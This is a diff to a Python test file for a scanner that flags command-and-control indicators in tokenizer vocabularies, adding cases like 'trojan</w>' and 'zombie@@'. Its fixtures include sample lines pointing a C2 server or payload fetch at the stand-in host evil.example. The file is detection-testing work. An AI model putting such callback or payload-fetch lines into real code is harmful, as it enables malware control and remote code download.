@@ -2158,6 +2158,8 @@ def test_text_scanner_tokenizer_vocab_cc_retarget_limit_fails_closed(tmp_path: P
         "\u0120trojan",
         "\u0120zombies",
         "\u2581zombie",
+        "trojan</w>",
+        "zombie@@",
     ],
 )
 def test_text_scanner_tokenizer_vocab_cc_indicator_entries_are_omitted(
@@ -2222,6 +2224,8 @@ def test_text_scanner_ambiguous_short_vocab_does_not_suppress_cc_pattern(tmp_pat
         ('requests.get("https://evil.example/payload")\n', "network_function"),
         ("trojan c2_server=https://evil.example/payload\n", "cc_pattern"),
         ("install trojan callback_url=https://evil.example/payload\n", "cc_pattern"),
+        ("trojan</w> c2_server=https://evil.example/payload\n", "cc_pattern"),
+        ("zombie@@ callback_url=https://evil.example/payload\n", "cc_pattern"),
     ],
 )
 def test_text_scanner_tokenizer_vocab_active_controls_remain_actionable(
